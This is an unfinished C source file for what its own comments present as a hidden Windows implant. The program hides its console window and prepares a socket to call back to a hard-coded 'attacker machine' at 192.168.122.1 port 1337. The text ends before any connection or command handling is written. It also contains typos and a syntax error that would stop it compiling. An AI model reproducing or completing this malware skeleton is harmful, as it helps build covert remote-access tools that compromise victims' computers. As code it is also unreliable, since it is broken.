#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>


int sock;

// hInstance is a handle to an instance or module
// hPrev is always 0.
// lpCmdLine has args
// nCmdLine says whether app will be minimized/maximized/shown
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
	// program should be invisible (not be shown)
	HWND window_handle;
	AllocConsole();

	// window name is null
	window_handle = FindWindowA("ConsoleWindowClass", NULL);

	// do not show a window for the program
	// 2nd arg is nCmdShow. 
	ShowWindow(window_handle, 0);


	// initialize variables for windows sockets
	struct sockaddr_in ServerAddr;
	unsigned short ServerPort;
	char *ServerIP;
	WSADATA wsaData;


	// TODO: This should be dynamically generated when creating a payload
	// Addr to call back to (the attacker machine)
	ServerIP = "192.168.122.1";
	ServerPort = 1337;

	// start a windows socket
	// MAKEWORD is from windef.h and does this? it makes a word ig
	// MAKEWORD(low,high)     ((WORD)(((BYTE)((DWORD_PTR)(low) & 0xFF)) | ((WORD)((BYTE)((DWORD_PTR)(high) & 0xFF))) << 8))
	if (WSAStartup(MAKEWORD(2, 0), &wsaDATA) != 0){
		exit(-1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServerAddr, 0, sizeof(ServerAddr));
	ServerAddr.sin_family = AF_INET:
	ServerAddr.sin_addr.s_addr = inet_addr(ServerIP);
	Server.Addr.sin_port = htons(ServerPort);
}

